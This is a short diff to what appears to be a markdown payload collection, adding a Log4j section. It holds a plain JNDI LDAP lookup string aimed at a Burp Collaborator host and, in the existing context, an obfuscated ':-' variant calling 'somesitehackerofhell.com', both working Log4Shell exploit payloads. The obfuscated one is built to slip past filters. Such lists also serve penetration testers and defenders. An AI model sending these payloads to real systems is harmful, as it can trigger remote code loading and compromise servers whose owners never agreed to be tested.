@@ -102,6 +102,10 @@
 # Payloads
 ## Log4j
 
+```
+${jndi:ldap://xxxxx.burpcollaborator.net/a}
+```
+
 ### ":-" notation
 ```
 ${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}
